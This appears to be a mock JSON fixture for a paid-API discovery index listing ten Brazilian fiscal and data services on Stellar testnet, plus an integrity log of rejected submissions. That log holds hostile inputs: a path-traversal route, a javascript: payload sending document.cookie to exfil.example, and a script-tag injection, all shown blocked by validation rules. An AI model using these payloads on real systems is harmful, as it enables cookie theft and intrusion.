@@ -1,0 +1,501 @@
+{
+  "generatedAt": 1786041982338,
+  "network": "stellar:testnet",
+  "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+  "facilitator": "http://localhost:4021",
+  "items": [
+    {
+      "id": "https://nfe.pregao.dev/v1/parse",
+      "resource": {
+        "url": "https://nfe.pregao.dev/v1/parse",
+        "serviceName": "Leitor de NF-e / DANFE",
+        "tags": [
+          "nfe",
+          "nota-fiscal",
+          "ocr",
+          "fiscal",
+          "brasil",
+          "documento"
+        ],
+        "iconUrl": "https://nfe.pregao.dev/icon.png",
+        "description": "Extrai XML de NF-e ou PDF de DANFE e devolve JSON estruturado: emitente, destinatário, itens, CFOP, impostos e chave de acesso de 44 dígitos. Treinado em nota fiscal eletrônica brasileira."
+      },
+      "type": "http",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "GHKTXSZTTCIC47H2HNCAELR7NMLUNAYN2FVQYUPNHAKRJ72TD6STDD2V",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "25000",
+      "input": {
+        "type": "http",
+        "method": "POST",
+        "body": {
+          "file": "multipart/form-data",
+          "mode": "xml|pdf"
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"chave\":\"3524...\",\"emitente\":{\"cnpj\":\"...\"},\"itens\":[...]}"
+      },
+      "routeTemplate": "/v1/parse",
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786041862338,
+      "settlements": 412
+    },
+    {
+      "id": "https://receita.pregao.dev/v1/cnpj/{cnpj}",
+      "resource": {
+        "url": "https://receita.pregao.dev/v1/cnpj/{cnpj}",
+        "serviceName": "Enriquecimento cadastral CNPJ",
+        "tags": [
+          "cnpj",
+          "receita-federal",
+          "cadastro",
+          "kyb",
+          "brasil"
+        ],
+        "iconUrl": "https://receita.pregao.dev/icon.png",
+        "description": "Consulta situação cadastral, CNAE principal e secundários, quadro societário e endereço a partir de um CNPJ. Cache de 24h sobre a base pública da Receita Federal."
+      },
+      "type": "http",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "GOYU3KEOC4KWQCCRO6A65TTQOQHHCK7UHWJW4ICRYUHY6FBHFOHYIBGK",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "8000",
+      "input": {
+        "type": "http",
+        "method": "GET",
+        "queryParams": {
+          "cnpj": "string(14)",
+          "socios": "boolean"
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"razao_social\":\"...\",\"situacao\":\"ATIVA\",\"cnae\":\"6201-5/01\"}"
+      },
+      "routeTemplate": "/v1/cnpj/{cnpj}",
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786041942338,
+      "settlements": 1877
+    },
+    {
+      "id": "https://pix.pregao.dev/mcp#conciliar_extrato",
+      "resource": {
+        "url": "https://pix.pregao.dev/mcp",
+        "serviceName": "Conciliação de extrato PIX",
+        "tags": [
+          "pix",
+          "conciliacao",
+          "financeiro",
+          "mcp",
+          "brasil"
+        ],
+        "iconUrl": "https://pix.pregao.dev/icon.png",
+        "description": "Ferramenta MCP que casa lançamentos de extrato PIX com contas a receber por valor, data e chave, devolvendo divergências ranqueadas por confiança."
+      },
+      "type": "mcp",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "GB2A3CWGYKMRNWXVNJTZ5MBC4RS4223BMMBPVT2VVA2SJFFAFWCFVEFA",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "45000",
+      "input": {
+        "type": "mcp",
+        "toolName": "conciliar_extrato",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "extrato": {
+              "type": "array"
+            },
+            "receber": {
+              "type": "array"
+            }
+          },
+          "required": [
+            "extrato",
+            "receber"
+          ]
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"casados\":128,\"divergencias\":[{\"conf\":0.94}]}"
+      },
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786041322338,
+      "settlements": 233
+    },
+    {
+      "id": "https://boleto.pregao.dev/v1/linha-digitavel",
+      "resource": {
+        "url": "https://boleto.pregao.dev/v1/linha-digitavel",
+        "serviceName": "Parser de boleto bancário",
+        "tags": [
+          "boleto",
+          "febraban",
+          "pagamento",
+          "validacao",
+          "brasil"
+        ],
+        "iconUrl": "https://boleto.pregao.dev/icon.png",
+        "description": "Decodifica linha digitável ou código de barras FEBRABAN: banco emissor, vencimento, valor, dígitos verificadores e validação de módulo 10/11."
+      },
+      "type": "http",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "GE3XLMVMU2VNABBLQFXWMDINXFU3O4DWD7QXJSW6CCRJLGTFISNHOODU",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "5000",
+      "input": {
+        "type": "http",
+        "method": "POST",
+        "body": {
+          "linha": "string(47|48)"
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"banco\":\"341\",\"vencimento\":\"2026-08-14\",\"valor\":\"1284.50\"}"
+      },
+      "routeTemplate": "/v1/linha-digitavel",
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786041622338,
+      "settlements": 640
+    },
+    {
+      "id": "https://fala.pregao.dev/v1/transcrever",
+      "resource": {
+        "url": "https://fala.pregao.dev/v1/transcrever",
+        "serviceName": "Transcrição pt-BR com diarização",
+        "tags": [
+          "audio",
+          "transcricao",
+          "pt-br",
+          "diarizacao",
+          "ia"
+        ],
+        "iconUrl": "https://fala.pregao.dev/icon.png",
+        "description": "Áudio para texto em português brasileiro com separação de locutores, marcação de tempo e vocabulário de call center. Suporta wav, mp3 e ogg."
+      },
+      "type": "http",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "GX2B33XVMD4T7IVN62TBU6BEUC5IVRVRGGUSTXX56E5F7E3MIAJR5KLJ",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "120000",
+      "input": {
+        "type": "http",
+        "method": "POST",
+        "body": {
+          "audio": "multipart/form-data",
+          "locutores": "integer"
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"duracao_s\":184,\"segmentos\":[{\"locutor\":\"A\",\"t\":0.0,\"texto\":\"...\"}]}"
+      },
+      "routeTemplate": "/v1/transcrever",
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786040362338,
+      "settlements": 96
+    },
+    {
+      "id": "https://juridico.pregao.dev/mcp#extrair_clausulas",
+      "resource": {
+        "url": "https://juridico.pregao.dev/mcp",
+        "serviceName": "Extrator de cláusulas contratuais",
+        "tags": [
+          "juridico",
+          "contrato",
+          "clausula",
+          "mcp",
+          "nlp"
+        ],
+        "iconUrl": "https://juridico.pregao.dev/icon.png",
+        "description": "Ferramenta MCP que localiza cláusulas de rescisão, multa, foro e reajuste em contratos em português e devolve o trecho literal com o offset no documento."
+      },
+      "type": "mcp",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "GNJBNIXY4GJIH3FI6IM3ULS6HVEYSA2DF24D7KUTKLOE5ZBSKGXKUY3U",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "90000",
+      "input": {
+        "type": "mcp",
+        "toolName": "extrair_clausulas",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "documento": {
+              "type": "string"
+            },
+            "tipos": {
+              "type": "array"
+            }
+          },
+          "required": [
+            "documento"
+          ]
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"clausulas\":[{\"tipo\":\"rescisao\",\"offset\":8123,\"texto\":\"...\"}]}"
+      },
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786031182338,
+      "settlements": 58
+    },
+    {
+      "id": "https://geo.pregao.dev/v1/cep/{cep}",
+      "resource": {
+        "url": "https://geo.pregao.dev/v1/cep/{cep}",
+        "serviceName": "Geocodificação de CEP",
+        "tags": [
+          "cep",
+          "geocoding",
+          "endereco",
+          "logistica"
+        ],
+        "iconUrl": "https://geo.pregao.dev/icon.png",
+        "description": "CEP para logradouro, bairro, município, UF e coordenadas. Cobertura nacional, resposta abaixo de 40 ms."
+      },
+      "type": "http",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "G57P4FBKKMCYP33Z4AK6ZJ4OONAUWMVY3DNS3JC562VDLK556VKHKDTX",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "2000",
+      "input": {
+        "type": "http",
+        "method": "GET",
+        "queryParams": {
+          "cep": "string(8)"
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"uf\":\"SP\",\"municipio\":\"São Paulo\",\"lat\":-23.5613,\"lon\":-46.6565}"
+      },
+      "routeTemplate": "/v1/cep/{cep}",
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786041892338,
+      "settlements": 3104
+    },
+    {
+      "id": "https://cambio.pregao.dev/v1/ptax",
+      "resource": {
+        "url": "https://cambio.pregao.dev/v1/ptax",
+        "serviceName": "Oráculo de câmbio BRL/USD",
+        "tags": [
+          "cambio",
+          "ptax",
+          "brl",
+          "oraculo",
+          "cotacao"
+        ],
+        "iconUrl": "https://cambio.pregao.dev/icon.png",
+        "description": "Cotação PTAX e spread de mercado BRL/USD com carimbo de tempo assinado, para agentes que precisam converter preço antes de pagar."
+      },
+      "type": "http",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "G7MB4ZK73SNQFF6JNJ56WTNQ3LGOCONEFLJHDG2AH5N2OYYI52YRUQ4Y",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "3000",
+      "input": {
+        "type": "http",
+        "method": "GET",
+        "queryParams": {
+          "par": "string",
+          "data": "date"
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"par\":\"BRL/USD\",\"compra\":5.1382,\"venda\":5.1394,\"ts\":1770000000}"
+      },
+      "routeTemplate": "/v1/ptax",
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786041962338,
+      "settlements": 1520
+    },
+    {
+      "id": "https://sped.pregao.dev/v1/validar",
+      "resource": {
+        "url": "https://sped.pregao.dev/v1/validar",
+        "serviceName": "Validador de arquivo SPED Fiscal",
+        "tags": [
+          "sped",
+          "efd",
+          "icms",
+          "fiscal",
+          "validacao"
+        ],
+        "iconUrl": "https://sped.pregao.dev/icon.png",
+        "description": "Valida blocos e registros de SPED Fiscal EFD ICMS/IPI, apontando linha, registro e regra violada antes da entrega ao fisco."
+      },
+      "type": "http",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "G32IFIF55FRAOGV3YWBFC4YM53SL4A3YY2QPTWUY6YZ52GUL6R7CL6KU",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "60000",
+      "input": {
+        "type": "http",
+        "method": "POST",
+        "body": {
+          "arquivo": "text/plain",
+          "versao": "string"
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"erros\":[{\"linha\":9123,\"registro\":\"C170\",\"regra\":\"...\"}]}"
+      },
+      "routeTemplate": "/v1/validar",
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786013182338,
+      "settlements": 71
+    },
+    {
+      "id": "https://docs.pregao.dev/v1/ocr",
+      "resource": {
+        "url": "https://docs.pregao.dev/v1/ocr",
+        "serviceName": "OCR de documento brasileiro (RG/CNH)",
+        "tags": [
+          "ocr",
+          "documento",
+          "rg",
+          "cnh",
+          "kyc"
+        ],
+        "iconUrl": "https://docs.pregao.dev/icon.png",
+        "description": "Lê RG, CNH e comprovante de residência, devolvendo campos normalizados e um score de adulteração por campo."
+      },
+      "type": "http",
+      "network": "stellar:testnet",
+      "scheme": "exact",
+      "payTo": "GAG3N6THOIPZENGE2TT4R4DEVYYRQSSZLTXNLJXPIGPCODFW5O6AYRIN",
+      "asset": "CSQ5WYWQEBHJ7WVLID432OI2BY6ZDKUBIQYIQASRUW32H2N5E3JAPAE5",
+      "maxAmountRequired": "35000",
+      "input": {
+        "type": "http",
+        "method": "POST",
+        "body": {
+          "imagem": "multipart/form-data"
+        }
+      },
+      "output": {
+        "type": "json",
+        "format": "application/json",
+        "example": "{\"tipo\":\"CNH\",\"nome\":\"...\",\"adulteracao\":0.02}"
+      },
+      "routeTemplate": "/v1/ocr",
+      "extensions": [
+        "bazaar"
+      ],
+      "lastSeenAt": 1786038682338,
+      "settlements": 289
+    }
+  ],
+  "total": 10,
+  "integrity": [
+    {
+      "at": 1786041802338,
+      "verdict": "rejected",
+      "rule": "route-template/traversal",
+      "field": "routeTemplate",
+      "input": "/v1/parse/{id}/../../admin/keys",
+      "reason": "Segmento \"../\" em route template — escapa do prefixo do recurso anunciado."
+    },
+    {
+      "at": 1786041442338,
+      "verdict": "soft-drop",
+      "rule": "resource/icon-url-origin",
+      "field": "resource.iconUrl",
+      "input": "http://198.51.100.7/icon.png",
+      "reason": "iconUrl fora da origem do recurso e sem TLS — campo descartado, registro mantido."
+    },
+    {
+      "at": 1786041142338,
+      "verdict": "soft-drop",
+      "rule": "resource/tags-cardinality",
+      "field": "resource.tags",
+      "input": "[\"nfe\",\"nf\",\"nfe-br\", … 96 more]",
+      "reason": "Excesso de tags (99 > 16). Excedente truncado para conter poluição de índice."
+    },
+    {
+      "at": 1786040662338,
+      "verdict": "rejected",
+      "rule": "payment/network-mismatch",
+      "field": "network",
+      "input": "eip155:8453",
+      "reason": "Rede fora do escopo do facilitador. Somente stellar:testnet é indexado."
+    },
+    {
+      "at": 1786040122338,
+      "verdict": "soft-drop",
+      "rule": "resource/description-length",
+      "field": "resource.description",
+      "input": "\"melhor api do mundo …\" (18.204 chars)",
+      "reason": "Descrição acima de 2.000 chars — truncada antes da indexação BM25."
+    },
+    {
+      "at": 1786039102338,
+      "verdict": "rejected",
+      "rule": "route-template/scheme-injection",
+      "field": "routeTemplate",
+      "input": "javascript:fetch(\"//exfil.example/\"+document.cookie)",
+      "reason": "Route template não é um caminho — esquema executável recusado."
+    },
+    {
+      "at": 1786037722338,
+      "verdict": "rejected",
+      "rule": "payment/payto-checksum",
+      "field": "payTo",
+      "input": "GBADCAFE…INVALID",
+      "reason": "Chave pública Stellar com checksum inválido — anúncio não pagável."
+    },
+    {
+      "at": 1786036282338,
+      "verdict": "soft-drop",
+      "rule": "resource/tag-charset",
+      "field": "resource.tags",
+      "input": "[\"nota\\u0000fiscal\",\"<script>alert(1)</script>\"]",
+      "reason": "Bytes nulos e markup em tags — normalizados fora do índice."
+    }
+  ]
+}
